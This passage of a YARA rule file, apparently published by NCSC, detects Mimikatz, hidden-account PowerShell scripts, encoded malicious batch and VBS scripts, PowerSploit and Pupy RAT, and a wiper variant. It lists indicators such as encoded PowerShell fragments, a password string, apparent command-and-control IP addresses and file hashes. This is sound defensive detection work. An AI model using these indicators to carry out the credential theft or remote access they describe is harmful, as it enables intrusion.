	$s1 = "ZnVuY3Rpb24gSW52b2tlLU1pbWlrYXR6C" 
	condition: 
	filesize < 1MB and $s1 
}

rule New_HiddenAccount 
{ 
   meta: 
      description = "PowerShell script to create hidden accounts" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
        $s1 = "Function New-OSCHiddenAccount" 
   condition: 
        filesize < 10KB and $s1 
} 

rule Malicious_WMI 
{ 
   meta: 
      description = "la.exe batch script" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
      $s1 = "c:\\users\\public\\la.exe" 
      $s2 = "3l3ctr0n!cs"   
   condition: 
        filesize < 10KB and ($s1 or $s2)  
} 



rule Malicious_Al_PS1 
{ 
   meta: 
      description = "Al.ps1 Powershell script" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
      $s1 = "AYgA5AGUAYgA0AGQAOQBlADkAYQAxAGIAMAA3ADQA" wide  
   condition: 
        filesize < 200KB and $s1  
} 




rule Malicious_Al_VBS 
{   meta: 
      description = "Al.vbs script" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
      $s1 = "C:\\Users\\public\\documents\\al.ps1" wide 
   condition: 
        filesize < 10KB and $s1 
} 


rule Malicious_Debug_bat 
{ 
   meta: 
      description = "Debug batch script" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
      $s1 = "WwBSAGUAZgBdAC4AQQBTAHMAZQBtAEIAbABZAC4ARwBlAHQAVABZ"   
   condition: 
        filesize < 10KB and $s1  
} 


rule Malicious_NTUSER_VBs 
{ 
   meta: 
      description = "VB script" 
      author = "NCSC" 
      date = "2017-08-26" 
   strings: 
      $s1 = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoA" wide  
   condition: 
        filesize < 10KB and $s1  
} 

rule pupy_RAT {
    meta:
        description = "A rule to detect usage of the powershell scripts, PowerSploit and Pupy RAT existence in memory"
        author = "NCSC"
        date = "2016-12-30"
    strings:
        $s0 = "Nicolas VERDIER" fullword
        $s1 = "Invoke-ReflectivePEInjection" fullword
        $s2 = "IMo8oosieVai" fullword
        $s3 = "eiloShaegae1" fullword
        $s4 = "69.87.223.26" fullword
        $s5 = "139.59.46.154" fullword
        $s6 = "89.107.61.225" fullword
    condition:
        any of them
}

rule WiperVariant {
   meta:
      description = "WiperVariant"
      author = "NCSC"
      date = "2018-12-13"
      hash0 = "5203628a89e0a7d9f27757b347118250f5aa6d0685d156e375b6945c8c05eb8a"
      hash1 = "3eab7112e94f9ec1e07b9ae4696052a7cf123bba"
      hash2 = "fdf409a9755a4ac20508d903f2325aec"
   strings:
      $s1 = "SlHost.exe" fullword wide
      $s2 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii
      $s3 = "get_BypassAcl" fullword ascii
      $s4 = "FileProcessIdsUsingFileInformation" fullword ascii
      $s5 = "<BypassAcl>k__BackingField" fullword ascii
      $s6 = "set_BypassAcl" fullword ascii
      $s7 = "bypassAcl" fullword ascii
      $s8 = "bypassAclCheck" fullword ascii
      $s9 = "--bypassAcl" fullword wide
      $s10 = "get_TooManyFilenamesError" fullword ascii
      $s11 = "get_UsageLine" fullword ascii
      $s12 = "get_InvalidSwitchError" fullword ascii
      $s13 = "SlHost.Resources" fullword wide
      $s14 = "InvalidCmdLineException" fullword ascii
      $s15 = "ParsedCmdLineArgs" fullword ascii
      $s16 = "CmdLineArgsParser" fullword ascii
      $s17 = "get_VersionLine" fullword ascii
      $s18 = "get_NoFilenamesSpecified" fullword ascii
      $s19 = "get_PrintStackTrace" fullword ascii
      $s20 = "get_SilentModeEnabled" fullword ascii
      $s21 = "MyApplication.app" fullword ascii
      $s22 = "PublicKeyToken=b77a5c561934e089" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and 10 of them
}
